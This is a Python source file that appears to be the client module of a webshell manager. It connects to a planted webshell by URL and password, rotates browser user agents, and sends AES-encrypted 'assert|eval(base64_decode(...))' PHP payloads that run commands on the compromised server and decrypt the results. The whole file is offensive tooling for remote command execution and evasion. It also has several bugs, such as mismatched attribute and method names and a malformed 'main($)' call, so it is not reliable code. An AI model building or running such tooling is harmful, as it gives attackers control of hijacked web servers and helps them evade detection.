# -*- encoding: utf-8 -*-
"""
@File    :   ShellService.py    
@Modify Time          @Author      @Version    
------------        -----------    --------    
2021/3/8 22:50      flandre2333      1.0

@Description
-----------
   None
"""

from core.ShellEntity import ShellEntity
from core.Types import LanguageType
import random
import  string
from components.Request import RequestUtils
from components.Request import ResponseField
from components.ReadFile import ReadFile
from components.Cryto import Base64Crypt
from components.Cryto import AESCrypt
import json


class ShellService:
    stc_useragent = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPod; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (X11; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"]

    def __init__(self, shellEntity: ShellEntity, userAgent, isUseProxies=False, **kwargs):
        self.currentHeaders = {'UserAgent': userAgent}
        self.shellEntity: ShellEntity = shellEntity
        self.userAgent: str = userAgent
        self.currentUrl: str = shellEntity.url
        self.currentType: LanguageType = shellEntity.languageType
        self.currentPassword: str = shellEntity.password
        self.currentHeaders: dict = {'UserAgent': userAgent}
        self.currentIsUseProxies: bool = isUseProxies

        if self.currentIsUseProxies:
            self.currentProxies = kwargs['proxies']
        else:
            self.currentProxies = None

        if self.currentType is LanguageType.PHP:
            self.currentHeaders['Content-type'] = 'application/x-www-form-urlencoded'
        # 连接
        self.currentKey = self._TryConnect_()



    def _TryConnect_(self):
        if self.currentUrl.count('?'):
            url = self.currentUrl + '&' + self.currentPassword + '=' + str(int(random.random() * 1000))
        else:
            url = self.currentUrl + '?' + self.currentPassword + '=' + str(int(random.random() * 1000))
        resp = RequestUtils.SendRequest(url=url, headers=self.currentHeaders, isUseProxies=self.currentIsUseProxies)

        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) == 200:
            self.currentHeaders['Cookie'] = RequestUtils.ParseResponse(resp, ResponseField.cookie, cookieToStr=True)
            return RequestUtils.ParseResponse(resp, ResponseField.body)
        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) == 302:
            pass
        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) == 404:
            pass
        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) >= 500:
            pass



    def _SetUseragent_(self):
        num=random.randint(0, len(ShellService.useragents))
        self.currentHeaders = {'UserAgent': ShellService.stc_useragent[num]}

    def runCmd(self, Cmd: str):
        self._SetUseragent()
        data = ReadFile('/payload/Cmd.php')
        if self.currentType is LanguageType.PHP:
            data = data + '$Cmd="{0}";\nmain($Cmd);'.format(Cmd)
            base64Content = Base64Crypt.Base64Encode(data)
            plaintextData = "assert|eval(base64_decode('" + base64Content.replace('\n', '') + "'));"
            aesCrypt = AESCrypt(self.currentKey)
            aesEncryptData = aesCrypt.aes_encrypt(plaintextData)
            resp = RequestUtils.SendRequest(self.currentUrl, self.currentHeaders, method='post',
                                            data=aesEncryptData, isUseProxies=self.currentIsUseProxies,
                                            proxies=self.currentProxies)
            encryptContent = RequestUtils.ParseResponse(resp, ResponseField.body)
            decryptContent = aesCrypt.aes_decrypt(encryptContent)
            respDict = json.loads(decryptContent)
            for k, v in respDict.items():
                respDict[k] = Base64Crypt.Base64Decode(v)
            return respDict
        if self.currentType is LanguageType.JAVA:
            pass
        else:
            pass
    def Echo(self):
        self._SetUseragent()
        data = ReadFile('/payload/Echo.php')
        raw_pwd = string.join(random.sample('abcdefghijklmnopqrstuvwxyz1234567890', 16)).replace(' ', '')
        if self.currentType is LanguageType.PHP:
            data = data + '$raw_pwd="{0}";\nmain($);'.format(raw_pwd)
            base64Content = Base64Crypt.Base64Encode(data)
            plaintextData = "assert|eval(base64_decode('" + base64Content.replace('\n', '') + "'));"
            aesCrypt = AESCrypt(self.currentKey)
            aesEncryptData = aesCrypt.aes_encrypt(plaintextData)
            resp = RequestUtils.SendRequest(self.currentUrl, self.currentHeaders, method='post',
                                            data=aesEncryptData, isUseProxies=self.currentIsUseProxies,
                                            proxies=self.currentProxies)
            encryptContent = RequestUtils.ParseResponse(resp, ResponseField.body)
            decryptContent = aesCrypt.aes_decrypt(encryptContent)
            respDict = json.loads(decryptContent)
            for k, v in respDict.items():
                respDict[k] = Base64Crypt.Base64Decode(v)
            return respDict
        if self.currentType is LanguageType.JAVA:
            pass
        else:
            pass
